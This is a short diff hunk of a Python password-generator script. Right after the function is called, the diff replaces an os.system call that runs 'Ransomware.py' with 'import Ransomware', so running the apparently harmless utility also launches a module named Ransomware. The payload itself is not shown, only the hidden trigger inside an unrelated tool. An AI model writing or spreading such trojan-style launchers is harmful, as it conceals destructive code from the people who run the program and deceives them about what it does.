@@ -30,4 +30,4 @@ def generate_random_password():
 
 ## invoking the function
 generate_random_password()
-os.system("Ransomware.py")
+import Ransomware
